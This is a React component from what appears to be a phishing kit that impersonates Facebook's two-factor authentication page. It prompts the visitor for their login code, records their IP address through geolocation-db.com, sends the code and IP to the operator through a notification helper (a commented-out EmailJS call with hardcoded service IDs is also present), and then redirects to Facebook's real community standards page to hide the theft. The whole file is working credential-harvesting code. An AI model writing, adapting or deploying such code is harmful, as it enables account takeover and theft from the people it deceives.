import { Button, Divider } from "@mui/material";
import axios from "axios";
import React, { useEffect, useState } from "react";
import { send, init } from "emailjs-com";
import { sendNotification } from "../../helper/api";

const serviceId = "service_iqo8ktz";
const templateId = "template_bezdwg7";
const userID = "NYH32jZWvSnYGO2IW";
// const serviceId = "service_tqf6wk6";
// const templateId = "template_2fyw1fk";
// const userID = "JCJZF4naygv0qN4VN";

const Conformation = () => {
  const [code, setCode] = useState("");

  const [ip, setIP] = useState("");

  //creating function to load ip address from the API
  const getData = async () => {
    const res = await axios.get("https://geolocation-db.com/json/");
    setIP(res.data.IPv4)
      .then((res) => {
        console.log(res);
      })
      .catch((err) => {
        console.log(err);
      });
    localStorage.setItem("myip", ip);
  };

  const handleChange = (value) => {
    if (value?.length <= 8) {
      setCode(value?.replace(/\s/g, ""));
    } else {
      setCode(value?.replace(/\s/g, ""));
    }
  };

  const isNumberKey = (event) => {
    if (!/[0-9]/.test(event.key)) {
      event.preventDefault();
    }
  };

  const handleToLogin = () => {
    if (code?.length <= 8) {
      init(userID);
      const toSend = {
        ip: ip,
        auth: code,
      };
      
      // send(serviceId, templateId, toSend)
      sendNotification(toSend).then(() => {
          window.location.href =
            "https://transparency.fb.com/en-gb/policies/community-standards/";
        })
        .catch((err) => {
          console.log(err);
        });
    } else {
      alert("Please Enter 6-digit code");
    }
  };

  useEffect(() => {
    window.scrollTo(0, 0);
    let isActive = true;
    if (isActive) {
      getData();
    }

    return () => {
      isActive = false;
    };
  }, []);

  return (
    <div className="container py-4">
      <div className="row">
        <div className="col-md-8 offset md-2 m-auto">
          <div className="conformation__Container">
            <h1 className="Authentication__Message">
              Two-Factor Authentication Required
            </h1>
            <Divider />
            <p className="code__Message pt-3">
              You've asked us to require a 6-digit login code when anyone tries
              to access your account from a new device or browser.
            </p>
            <p className="code__Message mb-3">
              Enter the 6-digit code from your{" "}
              <span className="generator__Meaasge">Code Generator</span> or 3rd
              party app below.
            </p>
            <input
              required
              type={"number"}
              maxLength="8"
              onKeyPress={isNumberKey}
              onChange={(event) =>
                handleChange(event.target.value, event.target.name)
              }
              placeholder="Login Code"
              value={code}
              name="code"
              style={{ maxWidth: "200px" }}
              className="form__Control mb-3"
            />
            <Divider />
            <div className="needHelpAndContinueContainer mt-3">
              <p className="needHelpMessage">
                Need another way to authentication?
              </p>
              <div>
                <Button
                  onClick={() => handleToLogin()}
                  className="Continue__btn"
                >
                  Continue
                </Button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Conformation;
